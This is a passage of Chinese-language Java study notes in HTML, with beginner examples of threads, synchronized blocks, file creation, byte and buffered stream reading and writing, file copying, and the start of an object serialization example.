class="hljs-variable">d2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;gzc&quot;</span>,<span class="hljs-number">19</span>));<br>                <span class="hljs-type">Thread</span> <span class="hljs-variable">d3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;acc&quot;</span>,<span class="hljs-number">19</span>));<br>                d3.setName(<span class="hljs-string">&quot;第四个&quot;</span>);<span class="hljs-comment">//重命名线程</span><br>                System.out.println(d.getName());<br>                            <span class="hljs-keyword">try</span> &#123;<br>                        Thread.sleep(<span class="hljs-number">3000</span>);<br>                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br><br>                &#125;<span class="hljs-comment">//sleep必须捕获异常处理</span><br>                System.out.println(d2.getName());<br>                System.out.println(d3.getName());<br>                d.start();<br>        &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>&#123;<br><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span>&#123;<br>        <span class="hljs-keyword">public</span> String name;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;<br>                <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>                        System.out.println(<span class="hljs-string">&quot;dog is running&quot;</span>);<br>                        <span class="hljs-keyword">try</span> &#123;<br>                                Thread.sleep(<span class="hljs-number">2000</span>);<br>                        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                                e.printStackTrace();<br>                        &#125;<br>                &#125;<br><br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Dog</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>                <span class="hljs-built_in">this</span>.name = name;<br>                <span class="hljs-built_in">this</span>.age = age;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;<br>                System.out.println(<span class="hljs-built_in">this</span>.name+<span class="hljs-string">&quot; is eating&quot;</span>);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>同步：</p><p>多线程编程中，有些敏感数据不希望被多个线程同时访问，此时就需要用同步技术来操作，保证数据在同一时刻最多只有一个线程来访问。使用</p><p>两种实现方式：</p><p>1.同步代码块：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">synchronized</span>&#123;<br><span class="hljs-comment">//TODO同步的代码块</span><br>&#125;<br>eg:<br><span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>()；<br><span class="hljs-keyword">synchronized</span> (object)&#123;<br><span class="hljs-comment">//代码块</span><br>&#125;<br></code></pre></td></tr></table></figure><p>2.用于方法的声明：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">func</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-comment">//同步的代码</span><br>&#125;<span class="hljs-comment">//同一时刻只能有一个进程来执行该方法</span><br></code></pre></td></tr></table></figure><p>IO流：</p><p>FileInputStream流：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>                        System.out.println(<span class="hljs-string">&quot;请输入文件名：&quot;</span>);<br>                        <span class="hljs-type">Scanner</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>                        fileName = input.next();<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">create</span>(fileName).createFile();<br>                &#125;<br>        &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">create</span>&#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;D:\\111\\&quot;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">create</span><span class="hljs-params">(String name)</span>&#123;<br>                fileName = name;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createFile</span><span class="hljs-params">()</span>&#123;<br>                <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(root+<span class="hljs-built_in">this</span>.fileName);<br>                <span class="hljs-comment">//File file = new File(root,this.fileName);) //根据父目录+子路径构建</span><br>                <span class="hljs-keyword">try</span> &#123;<br>                        file.createNewFile();<br>                        System.out.println(<span class="hljs-string">&quot;文件&quot;</span>+<span class="hljs-built_in">this</span>.fileName+<span class="hljs-string">&quot;创建成功&quot;</span>);<br>                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                        e.printStackTrace();<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>或者根据父路径的类再new一个类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>                        System.out.println(<span class="hljs-string">&quot;请输入文件名：&quot;</span>);<br>                        <span class="hljs-type">Scanner</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>                        fileName = input.next();<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">create</span>(fileName).createFile();<br>                &#125;<br>        &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">create</span>&#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;D:\\111\\&quot;</span>;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">f1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(root);<span class="hljs-comment">//此处！！！</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">create</span><span class="hljs-params">(String name)</span>&#123;<br>                fileName = name;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createFile</span><span class="hljs-params">()</span>&#123;<br>                <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(f1,<span class="hljs-built_in">this</span>.fileName);<br>                <span class="hljs-keyword">try</span> &#123;<br>                        file.createNewFile();<br>                        System.out.println(<span class="hljs-string">&quot;文件&quot;</span>+<span class="hljs-built_in">this</span>.fileName+<span class="hljs-string">&quot;创建成功&quot;</span>);<br>                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                        e.printStackTrace();<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>常见方法：</p><p><img src="/2023/04/24/java-note/image-20231004031341411.png"></p><p><img src="/2023/04/24/java-note/image-20231004031429608.png"></p><p>IO流：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">fName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>                        System.out.println(<span class="hljs-string">&quot;请输入文件名：&quot;</span>);<br>                        <span class="hljs-type">Scanner</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>                        fName = input.next();<br>                        <span class="hljs-type">int</span> <span class="hljs-variable">readFile</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>                        File file;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                                file = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(fName);<br>                                <span class="hljs-keyword">if</span> (!file.isFile())&#123;<br>                                        System.out.println(<span class="hljs-string">&quot;文件不存在，即将创建...&quot;</span>);<br>                                        file.createNewFile();<br>                                &#125;<br>                                <span class="hljs-keyword">else</span> &#123;<br>                                        System.out.println(<span class="hljs-string">&quot;文件已存在，即将读取文件内容：&quot;</span>);<br>                                        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInput</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                                        <span class="hljs-keyword">try</span> &#123;<br>                                                fileInput = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(fName);<br>                                                <span class="hljs-keyword">while</span> ((readFile = fileInput.read()) != -<span class="hljs-number">1</span>)&#123;<br>                                                        <span class="hljs-comment">//使用read()，逐字节读入，效率低下</span><br>                                                        System.out.print((<span class="hljs-type">char</span>) readFile);<br>                                                &#125;<br>                                        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                                                e.printStackTrace();<br>                                        &#125;<span class="hljs-keyword">finally</span> &#123;<br>                                                fileInput.close();<br>                                                <span class="hljs-comment">//释放资源</span><br>                                        &#125;<br><br>                                &#125;<br>                        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                                e.printStackTrace();<br>                        &#125;<br>                &#125;<br>        &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>666.txt内容如下：<img src="/2023/04/24/java-note/image-20231005025627972.png"></p><p>每8字节读取来提高效率将导致输出如下：</p><p><img src="/2023/04/24/java-note/image-20231005025729599.png"></p><p>开1024字节的缓存空间，输出如下：不管是哪一种，都注意输出时的new 一个string对象</p><p><img src="/2023/04/24/java-note/image-20231005025831737.png"></p><p>FileOutputStream：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">fName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>                        System.out.println(<span class="hljs-string">&quot;请输入文件名：&quot;</span>);<br>                        <span class="hljs-type">Scanner</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>                        fName = input.next();<br>                        System.out.println(<span class="hljs-string">&quot;请输入写入文件的内容：&quot;</span>);<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> input.next();<br>                        <span class="hljs-type">int</span> <span class="hljs-variable">writeFile</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>                        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                        File file;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                                output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(fName);<br>                                <span class="hljs-comment">//output = new FileOutputStream(fName);没有true参数，内容会覆写而不是追加</span><br>                                file = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(fName);<br>                                        output.write(str.getBytes(),<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);<br>                                        <span class="hljs-comment">//output.write(str.getBytes(),int off,int len);无偏移参数的话默认全部写入，否则写入从下标为off位置长度为len</span><br>                                        System.out.println(<span class="hljs-string">&quot;已向&quot;</span>+fName+<span class="hljs-string">&quot;内写入&quot;</span>+str);<br>                        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                                e.printStackTrace();<br>                        &#125;<br><br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>copy文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">fName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>                        System.out.println(<span class="hljs-string">&quot;请输入文件名：&quot;</span>);<br>                        <span class="hljs-type">Scanner</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>                        fName = input.next();<br>                        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                        <span class="hljs-comment">//定义一个字节数组,提高读取效果</span><br>                        <span class="hljs-type">int</span> <span class="hljs-variable">writeFile</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;d:/111/copy.txt&quot;</span>;<br>                        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                                fileInputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(fName);<br>                                fileOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(str);<br>                                <span class="hljs-keyword">while</span> ((writeFile = fileInputStream.read(buffer)) != -<span class="hljs-number">1</span>)&#123;<br>                                        fileOutputStream.write(buffer,<span class="hljs-number">0</span>,writeFile);<br>                                        <span class="hljs-comment">//读取到后，就写入到文件 通过 fileOutputStream</span><br>                                        <span class="hljs-comment">//即，是一边读，一边写</span><br>                                &#125;<br>                        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                                e.printStackTrace();<br>                        &#125;<span class="hljs-keyword">finally</span> &#123;<br>                                <span class="hljs-keyword">try</span> &#123;<br>                                        <span class="hljs-keyword">if</span> (fileInputStream != <span class="hljs-literal">null</span>)&#123;<br>                                                fileInputStream.close();<br>                                        &#125;<br>                                        <span class="hljs-keyword">if</span> (fileOutputStream != <span class="hljs-literal">null</span>)&#123;<br>                                                fileOutputStream.close();<br>                                        &#125;<span class="hljs-comment">//释放资源，释放资源时需要在finally语句内套try语句，close()方法需要捕获异常处理！</span><br>                                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                                        e.printStackTrace();<br>                                &#125;<br>                        &#125;<br><br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>释放资源，释放资源时需要在finally语句内套try语句，close()方法需要捕获异常处理！</strong></p><p>BufferedReader读取文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.FileReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;d:/111/666.txt&quot;</span>;<br>                <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(path));<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                        <span class="hljs-keyword">while</span> ((line = bufferedReader.readLine()) != <span class="hljs-literal">null</span>)&#123;<br>                                <span class="hljs-comment">//1. bufferedReader.readLine() 是按行读取文件</span><br>                                <span class="hljs-comment">//2. 当返回 null 时，表示文件读取完毕</span><br>                                System.out.println(line);<br>                        &#125;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                                bufferedReader.close();<br>                                <span class="hljs-comment">//释放资源</span><br>                        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                                e.printStackTrace();<br>                        &#125;<br>                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                        e.printStackTrace();<br>                &#125;<br><br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>BufferedWriter:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedWriter;<br><span class="hljs-keyword">import</span> java.io.FileWriter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;d:/111/666.txt&quot;</span>;<br>                <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">BufferedWriter</span> <span class="hljs-variable">bufferedWriter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(path));<br>                        <span class="hljs-comment">//FileWriter(path,true)的话是追加模式</span><br>                        bufferedWriter.write(<span class="hljs-string">&quot;hello&quot;</span>);<br>                        bufferedWriter.newLine();<br>                        bufferedWriter.write(<span class="hljs-string">&quot;potato&quot;</span>);<br>                        bufferedWriter.close();<br>                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                        e.printStackTrace();<br>                &#125;<br><br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>序列化反序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;d:/111/666.dat&quot;</span>;<br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>                <span class="hljs-type">int</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> input.nextInt();<br>                <span class="hljs-keyword">if</span> (flag == <span class="hljs-number">1</span>)&#123;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                                <span class="hljs-comment">//序列化</span><br>                                <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(path));<br>                                oos.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;wmt&quot;</span>,<span class="hljs-number">19</span>));<br>                                oos.writeInt(<span class="hljs-number">11</span>);<br>                                <span class="hljs-comment">//System.out.println();</span><br>                                oos.close();<br>                        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                                e.printStackTrace();<br>                        &#125;<br>                